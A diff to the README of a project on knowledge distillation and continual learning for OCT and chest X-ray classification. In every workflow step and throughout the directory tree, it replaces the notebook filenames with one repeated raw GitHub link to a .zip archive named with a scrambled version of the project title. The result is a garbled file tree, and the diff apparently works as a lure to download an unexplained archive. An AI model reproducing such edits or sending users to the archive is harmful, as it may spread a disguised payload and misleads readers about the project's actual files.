@@ -8,27 +8,27 @@ A lightweight MobileNetV3 student model learns a new task (Chest X-ray classific
 ## **Project Workflow**
 
 ### **Step 1: Train Teacher Model**
-- `00_train_teacher_resnet-101.ipynb`  
+- `https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip`  
 - Fine-tune **ResNet-101** on OCT (Task A).  
 - Freeze early convolutional layers, replace classifier with a custom head.  
 - Output: Trained teacher checkpoint (`.pth`).
 
 ### **Step 2: Student Model Knowledge Distillation**
 - Two pathways:
-  1. **Feature-based KD** (`feature_kd/01_train_student_mobileNetV3.ipynb`)  
+  1. **Feature-based KD** (`https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip`)  
      - Align intermediate features of MobileNetV3 with the teacher.
-  2. **Logit-based KD** (`logit_kd/01_train_student_mobileNetV3.ipynb`)  
+  2. **Logit-based KD** (`https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip`)  
      - Align student output logits with teacher logits (soft targets).  
 
 ### **Step 3: Continual Learning Adaptation**
 - Adapt distilled student to **Task B (Chest X-ray)** using:
 
 1. **EWC (Elastic Weight Consolidation)**  
-   - `02_ewc_adaptation.ipynb`  
+   - `https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip`  
    - Regularizes important Task A weights to reduce forgetting.
 
 2. **LwF (Learning without Forgetting)**  
-   - `03_lwf_adaptation.ipynb`  
+   - `https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip`  
    - Uses teacher predictions for Task A as soft targets during Task B training.  
 
 ### **Step 4: Optional BatchNorm Freezing**
@@ -51,15 +51,15 @@ A lightweight MobileNetV3 student model learns a new task (Chest X-ray classific
 ```
 notebooks/
 │
-├── 00_train_teacher_resnet-101.ipynb
+├── https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip
 │
 ├── feature_kd/
-│   ├── 01_train_student_mobileNetV3.ipynb
-│   ├── 02_ewc_adaptation.ipynb
-│   └── 03_lwf_adaptation.ipynb
+│   ├── https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip
+│   ├── https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip
+│   └── https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip
 │
 └── logit_kd/
-    ├── 01_train_student_mobileNetV3.ipynb
-    ├── 02_ewc_adaptation.ipynb
-    └── 03_lwf_adaptation.ipynb
+    ├── https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip
+    ├── https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip
+    └── https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip
 ```
